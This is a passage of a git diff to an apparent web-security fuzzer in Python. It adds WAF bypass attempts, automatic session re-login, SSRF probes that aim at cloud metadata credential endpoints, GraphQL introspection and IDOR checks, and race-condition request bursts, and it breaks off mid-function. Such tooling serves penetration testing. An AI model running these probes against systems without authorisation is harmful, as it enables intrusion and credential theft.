@@ -23,10 +23,14 @@ import hashlib
 import json
 import logging
 import math
+import re
 import time
+import uuid
+from collections.abc import AsyncIterator as AsyncIteratorABC
+from collections.abc import Awaitable, Iterable
 from dataclasses import dataclass, field
 from pathlib import Path
-from typing import Any, AsyncIterator, Callable
+from typing import Any, AsyncIterator, Callable, cast
 from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 import httpx
@@ -98,6 +102,42 @@ _ATTACK_TYPE_TO_PAYLOADS: dict[str, list[str]] = {
     "BUSINESS_LOGIC": ["mass_assignment", "parameter_pollution"],
     "INJECT":         ["sql_injection", "xss", "command_injection", "ssti"],
 }
+
+_PATTERN_URL_RE = re.compile(r"https?://[^\s\"')>]+", re.IGNORECASE)
+_CACHE_HEADER_RE = re.compile(
+    r"^(?:x-cache|cf-cache-status|age|via|x-served-by|x-cache-hits)$",
+    re.IGNORECASE,
+)
+
+
+def _load_json_safely(path: Path, default: Any) -> Any:
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            return json.load(f)
+    except Exception as exc:
+        logger.debug("Could not load %s: %s", path, exc)
+        return default
+
+
+def _flatten_chain_entries(raw: Any) -> list[dict[str, Any]]:
+    if isinstance(raw, dict):
+        candidate = raw.get("chains", [])
+    elif isinstance(raw, list):
+        candidate = raw
+    else:
+        return []
+    return [entry for entry in candidate if isinstance(entry, dict)]
+
+
+_patterns_file = Path(__file__).parent / "data" / "patterns.json"
+_zeroday_file = Path(__file__).parent / "data" / "zeroday_patterns.json"
+_attack_chain_file = Path(__file__).parent / "data" / "attack_chains.json"
+
+_EXPERT_PATTERNS: dict[str, dict[str, Any]] = _load_json_safely(_patterns_file, {})
+_ZERODAY_PATTERNS: dict[str, dict[str, Any]] = _load_json_safely(_zeroday_file, {})
+_ATTACK_CHAIN_LIBRARY: list[dict[str, Any]] = _flatten_chain_entries(
+    _load_json_safely(_attack_chain_file, [])
+)
 
 # ---------------------------------------------------------------------------
 # Dataclasses
@@ -184,6 +224,10 @@ class Fuzzer:
         timeout: int = 30,
         method: str = "GET",
         headers: dict[str, str] | None = None,
+        enable_waf_bypass: bool = True,
+        enable_rate_limit: bool = True,
+        enable_auth_recovery: bool = True,
+        auth_login_url: str | None = None,
     ):
         self.target = target
         self.wordlist = wordlist or FUZZ_POINTS
@@ -196,6 +240,285 @@ class Fuzzer:
         self._semaphore = asyncio.Semaphore(threads)
         # Track timeout occurrences per (param, vuln_type) for time-based confirmation
         self._timeout_counts: dict[str, int] = {}
+        self._direct_client: httpx.AsyncClient | None = None
+        
+        # Initialize WAF bypass engine
+        self.enable_waf_bypass = enable_waf_bypass
+        if enable_waf_bypass:
+            from .agent.waf_bypass import WAFBypassEngine
+            self.waf_engine = WAFBypassEngine(timeout=timeout)
+        else:
+            self.waf_engine = None
+        self.detected_wafs: list[str] = []
+        
+        # Initialize rate limiter
+        self.enable_rate_limit = enable_rate_limit
+        if enable_rate_limit:
+            from .agent.rate_limiter import AdaptiveRateLimiter
+            self.rate_limiter = AdaptiveRateLimiter(
+                base_delay=1.0 / threads,  # Rate limit to threads req/s
+                max_delay=60.0,
+                max_retries=5,
+                timeout=timeout,
+            )
+        else:
+            self.rate_limiter = None
+
+        # Initialize auth recovery engine
+        self.enable_auth_recovery = enable_auth_recovery
+        if enable_auth_recovery:
+            from .agent.auth_manager import AuthManager
+            self.auth_manager = AuthManager(timeout=timeout)
+        else:
+            self.auth_manager = None
+        self.auth_login_url = auth_login_url.strip() if isinstance(auth_login_url, str) and auth_login_url.strip() else None
+
+    async def close(self) -> None:
+        """Release async resources owned by the fuzzer."""
+        if self.waf_engine:
+            await self.waf_engine.close()
+        if self.rate_limiter:
+            await self.rate_limiter.close()
+        if self.auth_manager:
+            await self.auth_manager.close()
+        if self._direct_client:
+            await self._direct_client.aclose()
+            self._direct_client = None
+
+    async def __aenter__(self) -> "Fuzzer":
+        return self
+
+    async def __aexit__(self, exc_type, exc, tb) -> None:
+        await self.close()
+
+    async def _get_direct_client(self) -> httpx.AsyncClient:
+        """Get a reusable direct HTTP client for probe/fuzz requests."""
+        if self._direct_client is None:
+            self._direct_client = httpx.AsyncClient(
+                timeout=self.timeout,
+                verify=False,  # nosec B501 - security testing tool
+                follow_redirects=True,
+                headers=self.headers,
+            )
+        return self._direct_client
+
+    def _request_kwargs_for_value(self, param: str, value: str) -> dict[str, Any]:
+        """Build request kwargs for one fuzz parameter/value pair."""
+        kwargs: dict[str, Any] = {"headers": self.headers}
+        if self.method == "GET":
+            kwargs["params"] = {param: value}
+        else:
+            kwargs["data"] = {param: value}
+        return kwargs
+
+    def set_auth_credentials(
+        self,
+        username: str,
+        password: str,
+        extra_fields: dict[str, str] | None = None,
+        login_url: str | None = None,
+    ) -> None:
+        """Configure credentials for automatic auth recovery."""
+        if not self.auth_manager:
+            return
+        self.auth_manager.set_credentials(username, password, extra_fields)
+        if isinstance(login_url, str) and login_url.strip():
+            self.auth_login_url = login_url.strip()
+
+    def set_auth_login_url(self, login_url: str) -> None:
+        """Configure login endpoint used during auth recovery."""
+        clean = login_url.strip()
+        if clean:
+            self.auth_login_url = clean
+
+    def _resolve_auth_login_url(self) -> str | None:
+        """Resolve safest login URL for automatic auth recovery."""
+        if self.auth_login_url:
+            return self.auth_login_url
+        parsed = urlparse(self.target)
+        path = parsed.path.lower()
+        if any(token in path for token in ("/login", "/signin", "/sign-in", "/auth", "/session")):
+            return self.target
+        return None
+
+    def _refresh_cookie_header_from_auth(self) -> None:
+        """Sync recovered session cookies into request headers."""
+        if not self.auth_manager or not self.auth_manager.auth_cookies:
+            return
+        pairs: list[str] = []
+        for cookie in self.auth_manager.auth_cookies:
+            name = str(cookie.get("name", "")).strip()
+            value = str(cookie.get("value", "")).strip()
+            if name:
+                pairs.append(f"{name}={value}")
+        if pairs:
+            self.headers["Cookie"] = "; ".join(pairs)
+
+    async def _maybe_recover_auth(
+        self,
+        response: httpx.Response,
+        *,
+        param: str,
+        value: str,
+    ) -> httpx.Response:
+        """Attempt auth recovery and retry a blocked request once."""
+        if not self.auth_manager:
+            return response
+        if response.status_code not in (401, 403):
+            return response
+
+        login_url = self._resolve_auth_login_url()
+        if not login_url:
+            logger.debug(
+                "Skipping auth recovery for %s: no login URL configured",
+                self.target,
+            )
+            return response
+
+        recovered = await self.auth_manager.handle_auth_failure(response, login_url)
+        if not recovered:
+            return response
+
+        self._refresh_cookie_header_from_auth()
+        req_kwargs = self._request_kwargs_for_value(param, value)
+
+        try:
+            if self.rate_limiter:
+                retried = await self.rate_limiter.request(
+                    self.method,
+                    self.target,
+                    **req_kwargs,
+                )
+            else:
+                client = await self._get_direct_client()
+                if self.method == "GET":
+                    retried = await client.get(self.target, params={param: value})
+                else:
+                    retried = await client.post(self.target, data={param: value})
+        except Exception as exc:
+            logger.debug("Auth recovery retry failed: %s", exc)
+            return response
+
+        return retried if retried is not None else response
+
+    @staticmethod
+    def _response_elapsed_ms(response: httpx.Response, fallback_ms: float) -> float:
+        """Get request duration from response metadata with safe fallback."""
+        ext_val = response.extensions.get("airecon_request_ms")
+        if ext_val is not None:
+            try:
+                return float(ext_val)
+            except (TypeError, ValueError):
+                pass
+        if response.elapsed is not None:
+            try:
+                return float(response.elapsed.total_seconds() * 1000.0)
+            except Exception:
+                pass
+        return fallback_ms
+
+    @staticmethod
+    def _merge_headers(
+        base_headers: dict[str, str] | None,
+        override_headers: dict[str, str] | None,
+    ) -> dict[str, str] | None:
+        if not base_headers and not override_headers:
+            return None
+        merged: dict[str, str] = {}
+        if base_headers:
+            merged.update(base_headers)
+        if override_headers:
+            merged.update(override_headers)
+        return merged
+
+    @staticmethod
+    def _extract_urls_from_text(values: list[str]) -> list[str]:
+        found: list[str] = []
+        seen: set[str] = set()
+        for value in values:
+            for match in _PATTERN_URL_RE.findall(str(value)):
+                url = match.strip().rstrip(".,;")
+                if url and url not in seen:
+                    seen.add(url)
+                    found.append(url)
+        return found
+
+    def _collect_pattern_texts(self, keys: list[str], fields: list[str]) -> list[str]:
+        texts: list[str] = []
+        for key in keys:
+            expert = _EXPERT_PATTERNS.get(key, {})
+            zeroday = _ZERODAY_PATTERNS.get(key, {})
+            for source in (expert, zeroday):
+                for pattern_field in fields:
+                    items = source.get(pattern_field, [])
+                    if isinstance(items, list):
+                        texts.extend(str(item) for item in items if item)
+        return texts
+
+    def _collect_attack_chain_step_texts(self, trigger_keywords: list[str]) -> list[str]:
+        texts: list[str] = []
+        lowered_keywords = [k.lower() for k in trigger_keywords if k]
+        for chain in _ATTACK_CHAIN_LIBRARY:
+            trigger_blob = " ".join(str(t).lower() for t in chain.get("triggers", []))
+            if lowered_keywords and not any(kw in trigger_blob for kw in lowered_keywords):
+                continue
+            for step in chain.get("steps", []):
+                if isinstance(step, dict):
+                    desc = step.get("description", "")
+                else:
+                    desc = str(step)
+                if desc:
+                    texts.append(str(desc))
+        return texts
+
+    async def _probe_request(
+        self,
+        *,
+        url: str | None = None,
+        method: str | None = None,
+        params: dict[str, str] | None = None,
+        data: dict[str, str] | None = None,
+        json_body: Any = None,
+        headers: dict[str, str] | None = None,
+        content: bytes | str | None = None,
+        use_rate_limiter: bool = True,
+    ) -> tuple[httpx.Response | None, float]:
+        target_url = url or self.target
+        http_method = (method or self.method).upper()
+        merged_headers = self._merge_headers(self.headers, headers)
+        req_kwargs: dict[str, Any] = {}
+        if params is not None:
+            req_kwargs["params"] = params
+        if data is not None:
+            req_kwargs["data"] = data
+        if json_body is not None:
+            req_kwargs["json"] = json_body
+        if content is not None:
+            req_kwargs["content"] = content
+        if merged_headers is not None:
+            req_kwargs["headers"] = merged_headers
+
+        t0 = time.monotonic()
+        try:
+            if use_rate_limiter and self.rate_limiter:
+                response = await self.rate_limiter.request(http_method, target_url, **req_kwargs)
+                if response is None:
+                    return None, (time.monotonic() - t0) * 1000.0
+                elapsed = self._response_elapsed_ms(
+                    response,
+                    fallback_ms=(time.monotonic() - t0) * 1000.0,
+                )
+                return response, elapsed
+
+            client = await self._get_direct_client()
+            response = await client.request(http_method, target_url, **req_kwargs)
+            elapsed = (time.monotonic() - t0) * 1000.0
+            return response, elapsed
+        except httpx.TimeoutException:
+            return None, self.timeout * 1000.0
+        except Exception as exc:
+            logger.debug("Advanced probe request failed method=%s url=%s: %s", http_method, target_url, exc)
+            return None, (time.monotonic() - t0) * 1000.0
 
     async def _fetch_baseline(self, param: str) -> dict[str, Any]:
         """Fetch baseline response for a parameter with a benign value.
@@ -209,10 +532,32 @@ class Fuzzer:
             return self._baseline[param]
         try:
             samples: list[dict[str, Any]] = []
-            async with httpx.AsyncClient(
-                timeout=self.timeout, verify=False, follow_redirects=True,  # nosec B501 - security testing tool
-                headers=self.headers,
-            ) as client:
+            
+            # Use rate limiter if enabled
+            if self.rate_limiter:
+                for _ in range(2):
+                    t0 = time.monotonic()
+                    resp = await self.rate_limiter.request(
+                        self.method,
+                        self.target,
+                        **self._request_kwargs_for_value(param, "test"),
+                    )
+                    if resp is None:
+                        raise RuntimeError("baseline request failed after retries")
+                    elapsed = self._response_elapsed_ms(
+                        resp,
+                        fallback_ms=(time.monotonic() - t0) * 1000.0,
+                    )
+                    samples.append({
+                        "body": resp.text,
+                        "status": resp.status_code,
+                        "time_ms": elapsed,
+                        "length": len(resp.text),
+                        "headers": dict(resp.headers),
+                    })
+            else:
+                # Fallback to direct httpx
+                client = await self._get_direct_client()
                 for _ in range(2):
                     t0 = time.monotonic()
                     if self.method == "GET":
@@ -232,7 +577,19 @@ class Fuzzer:
                         "status": resp.status_code,
                         "time_ms": elapsed,
                         "length": len(resp.text),
+                        "headers": dict(resp.headers),
                     })
+
+            # Detect WAF from baseline response
+            if self.waf_engine and samples:
+                detected = self.waf_engine.detect_waf(
+                    samples[0].get("headers", {}),
+                    samples[0].get("body", ""),
+                    samples[0].get("status", 200),
+                )
+                if detected and not self.detected_wafs:
+                    self.detected_wafs = detected
+                    logger.info(f"WAF detected during baseline: {', '.join(detected)}")
 
             # Use first sample as canonical baseline body; compute length
             # variance across both samples as the natural noise floor.
@@ -260,6 +617,16 @@ class Fuzzer:
             # Use status=-1 (not 200) so fuzz_parameters can skip unreachable
             # params rather than including them with a misleading 200 baseline.
             return {"body": "", "status": -1, "time_ms": 0.0, "length": 0, "length_variance": 0}
+
+    async def probe(self, param: str) -> dict[str, Any]:
+        """Compatibility probe API used by real-time tester and older tests."""
+        baseline = await self._fetch_baseline(param)
+        return {
+            "status": int(baseline.get("status", -1)),
+            "response_time": float(baseline.get("time_ms", 0.0)) / 1000.0,
+            "body_length": int(baseline.get("length", 0)),
+            "signature": str(baseline.get("signature", "")),
+        }
 
     async def fuzz_parameters(
         self,
@@ -290,38 +657,30 @@ class Fuzzer:
 
         # Build baseline for each param first
         baseline_tasks = [self._fetch_baseline(p) for p in params]
-        await asyncio.gather(*baseline_tasks, return_exceptions=True)
+        baseline_results = await asyncio.gather(*baseline_tasks, return_exceptions=True)
 
-        # WAF pre-check: skip params whose baseline response indicates hard blocking.
-        # 401/403 are only skipped when no auth headers are configured — if we have
-        # session auth and still get 401, the endpoint itself is auth-gated and we
-        # should still fuzz it (the auth may be bypassed).
-        # 429/503 are rate-limit / unavailable — always skip to avoid burning limits.
-        has_auth = bool(self.headers)
-        clean_params: list[str] = []
-        for param in params:
-            b_status = self._baseline.get(param, {}).get("status", 200)
-            if b_status == -1:
+        # FIX #5 (High): Propagate baseline failures explicitly
+        # Check which params failed baseline and log them before filtering
+        unreachable_params = []
+        for i, (param, result) in enumerate(zip(params, baseline_results)):
+            if isinstance(result, Exception):
                 logger.warning(
-                    f"Skipping param '{param}' — baseline fetch failed (target unreachable)"
+                    f"Param '{param}' baseline fetch raised exception: {result}"
                 )
-            elif b_status in (429, 503):
+                unreachable_params.append(param)
+            elif isinstance(result, dict) and result.get("status") == -1:
                 logger.warning(
-                    f"Skipping param '{param}' — baseline returned HTTP {b_status} "
-                    "(rate-limited / service unavailable)"
+                    f"Param '{param}' baseline returned status=-1 (target unreachable)"
                 )
-            elif b_status in (401, 403) and not has_auth:
-                logger.warning(
-                    f"Skipping param '{param}' — baseline returned HTTP {b_status} "
-                    "(WAF/auth blocking detected; pass auth headers to fuzz anyway)"
-                )
-            else:
-                if b_status in (401, 403) and has_auth:
-                    logger.info(
-                        f"Param '{param}' baseline returned HTTP {b_status} but auth headers "
-                        "are configured — fuzzing anyway (may reveal auth bypass)"
-                    )
-                clean_params.append(param)
+                unreachable_params.append(param)
+        
+        if unreachable_params:
+            logger.info(
+                f"Skipping {len(unreachable_params)}/{len(params)} params due to baseline failures: "
+                f"{unreachable_params[:5]}{'...' if len(unreachable_params) > 5 else ''}"
+            )
+
+        clean_params = self._filter_fuzzable_params(params)
 
         all_vuln_types = list(FUZZ_PAYLOADS.keys())
 
@@ -349,6 +708,74 @@ class Fuzzer:
 
         return self.results
 
+    def _filter_fuzzable_params(self, params: list[str]) -> list[str]:
+        """Filter params based on baseline accessibility and auth context."""
+        has_auth = bool(self.headers)
+        clean_params: list[str] = []
+        for param in params:
+            b_status = self._baseline.get(param, {}).get("status", 200)
+            if b_status == -1:
+                logger.warning(
+                    f"Skipping param '{param}' — baseline fetch failed (target unreachable)"
+                )
+            elif b_status in (429, 503):
+                logger.warning(
+                    f"Skipping param '{param}' — baseline returned HTTP {b_status} "
+                    "(rate-limited / service unavailable)"
+                )
+            elif b_status in (401, 403) and not has_auth:
+                logger.warning(
+                    f"Skipping param '{param}' — baseline returned HTTP {b_status} "
+                    "(WAF/auth blocking detected; pass auth headers to fuzz anyway)"
+                )
+            else:
+                if b_status in (401, 403) and has_auth:
+                    logger.info(
+                        f"Param '{param}' baseline returned HTTP {b_status} but auth headers "
+                        "are configured — fuzzing anyway (may reveal auth bypass)"
+                    )
+                clean_params.append(param)
+        return clean_params
+
+    async def fuzz(
+        self,
+        params: list[str],
+        vuln_types: list[str] | None = None,
+        param_type_hints: dict[str, str] | None = None,
+        *,
+        skip_baseline: bool = False,
+    ) -> AsyncIterator[FuzzResult]:
+        """Stream findings as they are discovered.
+
+        This method is intentionally sequential for predictable real-time
+        streaming and easier external mocking in tests.
+        """
+        self._timeout_counts.clear()
+        if not FUZZ_PAYLOADS:
+            return
+
+        if not skip_baseline:
+            baseline_tasks = [self._fetch_baseline(p) for p in params]
+            await asyncio.gather(*baseline_tasks, return_exceptions=True)
+
+        clean_params = self._filter_fuzzable_params(params)
+        all_vuln_types = list(FUZZ_PAYLOADS.keys())
+
+        for param in clean_params:
+            if param_type_hints and param in param_type_hints:
+                p_type = param_type_hints[param]
+                effective = _ATTACK_TYPE_TO_PAYLOADS.get(
+                    p_type, vuln_types or all_vuln_types
+                )
+            else:
+                effective = vuln_types or all_vuln_types
+            for vt in effective:
+                for payload in FUZZ_PAYLOADS.get(vt, []):
+                    result = await self._fuzz_single(param, payload, vt)
+                    if isinstance(result, FuzzResult) and result.confidence > 0.6:
+                        self.results.append(result)
+                        yield result
+
     async def _fuzz_single(
         self,
         param: str,
@@ -361,24 +788,63 @@ class Fuzzer:
                 "body": "", "status": 200, "time_ms": 100.0, "length": 0, "length_variance": 0
             })
             try:
-                async with httpx.AsyncClient(
-                    timeout=self.timeout, verify=False, follow_redirects=True,  # nosec B501 - security testing tool
-                    headers=self.headers,
-                ) as client:
+                resp: httpx.Response
+                # Use rate limiter if enabled
+                if self.rate_limiter:
+                    t0 = time.monotonic()
+                    rate_limited_resp = await self.rate_limiter.request(
+                        self.method,
+                        self.target,
+                        **self._request_kwargs_for_value(param, payload),
+                    )
+                    if rate_limited_resp is None:
+                        # Rate limiter exhausted retries
+                        return None
+                    resp = rate_limited_resp
+                    elapsed = self._response_elapsed_ms(
+                        resp,
+                        fallback_ms=(time.monotonic() - t0) * 1000.0,
+                    )
+                else:
+                    # Fallback to direct httpx
+                    client = await self._get_direct_client()
                     t0 = time.monotonic()
                     if self.method == "GET":
-                        parsed = urlparse(self.target)
-                        params = parse_qs(parsed.query)
-                        params[param] = [payload]
-                        url = urlunparse(
-                            parsed._replace(
-                                query=urlencode(
-                                    params, doseq=True)))
-                        resp = await client.get(url)
+                        resp = await client.get(self.target, params={param: payload})
                     else:
                         resp = await client.post(self.target, data={param: payload})
                     elapsed = (time.monotonic() - t0) * 1000
 
+                resp = await self._maybe_recover_auth(resp, param=param, value=payload)
+                elapsed = self._response_elapsed_ms(resp, fallback_ms=elapsed)
+                
+                # WAF bypass: if 403 and WAF detected, try bypass strategies
+                if resp.status_code == 403 and self.waf_engine and self.detected_wafs:
+                    logger.info(
+                        f"403 detected on param={param} — attempting WAF bypass "
+                        f"for {', '.join(self.detected_wafs)}"
+                    )
+                    
+                    # Try WAF bypass for this payload
+                    bypass_result = await self.waf_engine.test_bypass(
+                        target_url=self.target,
+                        waf_type=self.detected_wafs[0],  # Use first detected WAF
+                        payload=payload,
+                        param_name=param,
+                        method=self.method,
+                        base_headers=self.headers,
+                    )
+                    
+                    if bypass_result.get("successful_bypasses"):
+                        logger.info(
+                            f"WAF bypass successful for {param}={payload}: "
+                            f"{bypass_result['successful_bypasses'][0]['strategy']}"
+                        )
+                        bypass_response = bypass_result.get("response")
+                        if isinstance(bypass_response, httpx.Response):
+                            resp = bypass_response
+                            elapsed = self._response_elapsed_ms(resp, fallback_ms=elapsed)
+                
                 fuzz_sig = response_signature(resp.status_code, resp.text)
                 baseline_sig = baseline.get("signature", "")
 
@@ -452,6 +918,564 @@ class Fuzzer:
                     f"Fuzz request error param={param} payload={payload!r}: {exc}"
                 )
         return None
+
+    @staticmethod
+    def _dedupe_payloads(payloads: list[str], limit: int = 12) -> list[str]:
+        seen: set[str] = set()
+        result: list[str] = []
+        for payload in payloads:
+            p = str(payload).strip()
+            if not p or p in seen:
+                continue
+            seen.add(p)
+            result.append(p)
+            if len(result) >= limit:
+                break
+        return result
+
+    def _candidate_params_for_type(self, type_hint: str, max_items: int = 5) -> list[str]:
+        known = [p.lower() for p in PARAM_TYPE_MAP.get(type_hint, [])]
+        from_wordlist = [p for p in self.wordlist if p.lower() in known]
+        merged = self._dedupe_payloads(from_wordlist + PARAM_TYPE_MAP.get(type_hint, []), limit=max_items)
+        return merged
+
+    def _build_finding(
+        self,
+        *,
+        param: str,
+        payload: str,
+        vuln_type: str,
+        confidence: float,
+        evidence: str,
+        response: httpx.Response | None,
+        time_ms: float,
+    ) -> FuzzResult:
+        if response is None:
+            code = 0
+            length = 0
+        else:
+            code = response.status_code
+            length = len(response.text)
+        return FuzzResult(
+            target=self.target,
+            parameter=param,
+            payload=payload,
+            vuln_type=vuln_type,
+            severity=_confidence_to_severity(confidence),
+            evidence=evidence,
+            confidence=confidence,
+            response_code=code,
+            response_length=length,
+            time_ms=time_ms,
+        )
+
+    def _record_findings(self, findings: list[FuzzResult]) -> list[FuzzResult]:
+        existing = {
+            (r.parameter, r.payload, r.vuln_type, r.response_code)
+            for r in self.results
+        }
+        added: list[FuzzResult] = []
+        for finding in findings:
+            fp = (finding.parameter, finding.payload, finding.vuln_type, finding.response_code)
+            if fp in existing:
+                continue
+            existing.add(fp)
+            self.results.append(finding)
+            added.append(finding)
+        return added
+
+    async def run_phase2_advanced_tests(
+        self,
+        *,
+        ssrf_params: list[str] | None = None,
+        graphql_endpoints: list[str] | None = None,
+        race_params: list[str] | None = None,
+    ) -> list[FuzzResult]:
+        """Run phase-2 advanced probes: cloud SSRF, GraphQL, and race-condition tests."""
+        findings: list[FuzzResult] = []
+        findings.extend(await self._run_cloud_ssrf_exploitation(ssrf_params))
+        findings.extend(await self._run_graphql_automation(graphql_endpoints))
+        findings.extend(await self._run_race_condition_testing(race_params))
+        return self._record_findings(findings)
+
+    async def run_phase3_advanced_tests(
+        self,
+        *,
+        store_params: list[str] | None = None,
+        trigger_paths: list[str] | None = None,
+    ) -> list[FuzzResult]:
+        """Run phase-3 advanced probes: second-order and cache/desync testing."""
+        findings: list[FuzzResult] = []
+        findings.extend(await self._run_second_order_detection(store_params, trigger_paths))
+        findings.extend(await self._run_http_desync_cache_testing())
+        return self._record_findings(findings)
+
+    async def _run_cloud_ssrf_exploitation(
+        self,
+        params: list[str] | None,
+    ) -> list[FuzzResult]:
+        candidates = params[:] if params else self._candidate_params_for_type("SSRF", max_items=4)
+        if not candidates:
+            return []
+
+        pattern_texts = self._collect_pattern_texts(
+            ["cloud_metadata_testing", "ssrf_via_headers"],
+            ["suggested_actions", "test_vectors"],
+        )
+        pattern_texts.extend(self._collect_attack_chain_step_texts(["ssrf", "metadata"]))
+        payloads = (
+            CHAIN_PAYLOADS.get("ssrf", [])
+            + FUZZ_PAYLOADS.get("ssrf", [])[:6]
+            + self._extract_urls_from_text(pattern_texts)
+        )
+        payloads = [p for p in self._dedupe_payloads(payloads, limit=10) if p.lower().startswith("http")]
+        if not payloads:
+            return []
+
+        findings: list[FuzzResult] = []
+        metadata_markers = (
+            "latest/meta-data",
+            "security-credentials",
+            "metadata-flavor",
+            "computeMetadata",
+            "subscriptionid",
+            "instance-id",
+            "ami-id",
+        )
+
+        for param in candidates:
+            baseline = await self._fetch_baseline(param)
+            baseline_status = int(baseline.get("status", 0))
+            for payload in payloads:
+                extra_headers: dict[str, str] = {}
+                lowered_payload = payload.lower()
+                if "metadata.google.internal" in lowered_payload:
+                    extra_headers["Metadata-Flavor"] = "Google"
+                if "/metadata/instance" in lowered_payload or "api-version=" in lowered_payload:
+                    extra_headers["Metadata"] = "true"
+
+                req_data = {param: payload}
+                if self.method == "GET":
+                    resp, elapsed = await self._probe_request(
+                        method=self.method,
+                        params=req_data,
+                        headers=extra_headers,
+                    )
+                else:
+                    resp, elapsed = await self._probe_request(
+                        method=self.method,
+                        data=req_data,
+                        headers=extra_headers,
+                    )
+                if resp is None:
+                    continue
+
+                body_lower = resp.text.lower()
+                marker_hits = [m for m in metadata_markers if m in body_lower]
+                if resp.status_code in (200, 206) and marker_hits:
+                    confidence = min(0.95, 0.82 + (0.03 * len(marker_hits)))
+                    findings.append(self._build_finding(
+                        param=param,
+                        payload=payload,
+                        vuln_type="ssrf_cloud_metadata",
+                        confidence=confidence,
+                        evidence=(
+                            f"SSRF payload reached metadata/internal content (markers: {', '.join(marker_hits[:3])})"
+                        ),
+                        response=resp,
+                        time_ms=elapsed,
+                    ))
+                    break
+
+                if (
+                    baseline_status > 0
+                    and resp.status_code != baseline_status
+                    and resp.status_code in (301, 302, 307, 308, 401, 403)
+                    and ("169.254.169.254" in lowered_payload or "metadata.google.internal" in lowered_payload)
+                ):
+                    findings.append(self._build_finding(
+                        param=param,
+                        payload=payload,
+                        vuln_type="ssrf_internal_probe",
+                        confidence=0.64,
+                        evidence=(
+                            f"SSRF probe changed response code {baseline_status}→{resp.status_code} for cloud metadata target"
+                        ),
+                        response=resp,
+                        time_ms=elapsed,
+                    ))
+                    break
+
+        return findings
+
+    async def _run_graphql_automation(
+        self,
+        endpoint_hints: list[str] | None,
+    ) -> list[FuzzResult]:
+        parsed = urlparse(self.target)
+        base = f"{parsed.scheme}://{parsed.netloc}" if parsed.scheme and parsed.netloc else self.target
+        default_paths = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]
+        endpoints: list[str] = []
+        if endpoint_hints:
+            endpoints.extend(endpoint_hints)
+        if "/graphql" in parsed.path or "/gql" in parsed.path:
+            endpoints.append(self.target)
+        endpoints.extend([base.rstrip("/") + p for p in default_paths])
+        endpoints = self._dedupe_payloads(endpoints, limit=4)
+
+        graphql_payloads = FUZZ_PAYLOADS.get("graphql", [])
+        introspection = next(
+            (p for p in graphql_payloads if "__schema" in p),
+            "query{__schema{types{name}}}",
+        )
+        idor_probe = next(
+            (p for p in graphql_payloads if "user(id:" in p.lower()),
+            'query{user(id:"1"){id,name,email,role}}',
+        )
+        findings: list[FuzzResult] = []
+
+        for endpoint in endpoints:
+            probe_resp, probe_ms = await self._probe_request(
+                url=endpoint,
+                method="POST",
+                json_body={"query": "{__typename}"},
+                headers={"Content-Type": "application/json"},
+            )
+            if probe_resp is None:
+                continue
+            probe_lower = probe_resp.text.lower()
+            if not (
+                "__typename" in probe_lower
+                or '"data"' in probe_lower
+                or "graphql" in probe_resp.headers.get("content-type", "").lower()
+            ):
+                continue
+
+            introspection_resp, introspection_ms = await self._probe_request(
+                url=endpoint,
+                method="POST",
+                json_body={"query": introspection},
+                headers={"Content-Type": "application/json"},
+            )
+            if introspection_resp is not None:
+                body_lower = introspection_resp.text.lower()
+                if introspection_resp.status_code == 200 and "__schema" in body_lower and "types" in body_lower:
+                    findings.append(self._build_finding(
+                        param="graphql",
+                        payload=introspection[:120],
+                        vuln_type="graphql_introspection_exposed",
+                        confidence=0.90,
+                        evidence=f"GraphQL introspection enabled on {endpoint}",
+                        response=introspection_resp,
+                        time_ms=introspection_ms,
+                    ))
+
+            batch_payload = [{"query": "query{__typename}"} for _ in range(10)]
+            batch_resp, batch_ms = await self._probe_request(
+                url=endpoint,
+                method="POST",
+                json_body=batch_payload,
+                headers={"Content-Type": "application/json"},
+            )
+            if batch_resp is not None and batch_resp.status_code == 200 and batch_resp.text.lstrip().startswith("["):
+                findings.append(self._build_finding(
+                    param="graphql",
+                    payload="batch_query(10)",
+                    vuln_type="graphql_batching_enabled",
+                    confidence=0.75,
+                    evidence=f"GraphQL batching accepted on {endpoint}; potential rate-limit bypass vector",
+                    response=batch_resp,
+                    time_ms=batch_ms,
+                ))
+
+            id1_resp, id1_ms = await self._probe_request(
+                url=endpoint,
+                method="POST",
+                json_body={"query": idor_probe},
+                headers={"Content-Type": "application/json"},
+            )
+            id2_query = idor_probe.replace('id:"1"', 'id:"2"')
+            id2_resp, _ = await self._probe_request(
+                url=endpoint,
+                method="POST",
+                json_body={"query": id2_query},
+                headers={"Content-Type": "application/json"},
+            )
+            if id1_resp is not None and id2_resp is not None:
+                s1 = response_signature(id1_resp.status_code, id1_resp.text)
+                s2 = response_signature(id2_resp.status_code, id2_resp.text)
+                sensitive_markers = ("email", "password", "token", "secret", "role")
+                if (
+                    s1 != s2
+                    and any(m in id1_resp.text.lower() for m in sensitive_markers)
+                    and any(m in id2_resp.text.lower() for m in sensitive_markers)
+                ):
+                    findings.append(self._build_finding(
+                        param="graphql",
+                        payload=idor_probe[:120],
+                        vuln_type="graphql_idor_candidate",
+                        confidence=0.79,
+                        evidence=f"GraphQL object access differs by sequential IDs on {endpoint} with sensitive fields returned",
+                        response=id2_resp,
+                        time_ms=id1_ms,
+                    ))
+
+        return findings
+
+    async def _run_race_condition_testing(
+        self,
+        params: list[str] | None,
+    ) -> list[FuzzResult]:
+        candidate_params = params[:] if params else self._candidate_params_for_type("BUSINESS_LOGIC", max_items=2)
+        race_payloads = self._dedupe_payloads(FUZZ_PAYLOADS.get("race_condition", [])[:3], limit=3)
+        if not candidate_params or not race_payloads:
+            return []
+
+        findings: list[FuzzResult] = []
+        for param in candidate_params:
+            for payload in race_payloads:
+                async def _single() -> tuple[httpx.Response | None, float]:
+                    req_data = {param: payload}
+                    if self.method == "GET":
+                        return await self._probe_request(
+                            method=self.method,
+                            params=req_data,
+                            use_rate_limiter=False,
+                        )
+                    return await self._probe_request(
+                        method=self.method,
+                        data=req_data,
+                        use_rate_limiter=False,
+                    )
+
+                bursts = await asyncio.gather(*[_single() for _ in range(6)], return_exceptions=True)
+                responses: list[httpx.Response] = []
+                timings: list[float] = []
+                for item in bursts:
+                    if isinstance(item, Exception):
+                        continue
+                    resp, elapsed = item
+                    if resp is None:
+                        continue
+                    responses.append(resp)
+                    timings.append(elapsed)
+                if len(responses) < 3:
+                    continue
+
+                status_set = {r.status_code for r in responses}
+                sig_set = {response_signature(r.status_code, r.text) for r in responses}
+                if len(status_set) > 1 or len(sig_set) > 1:
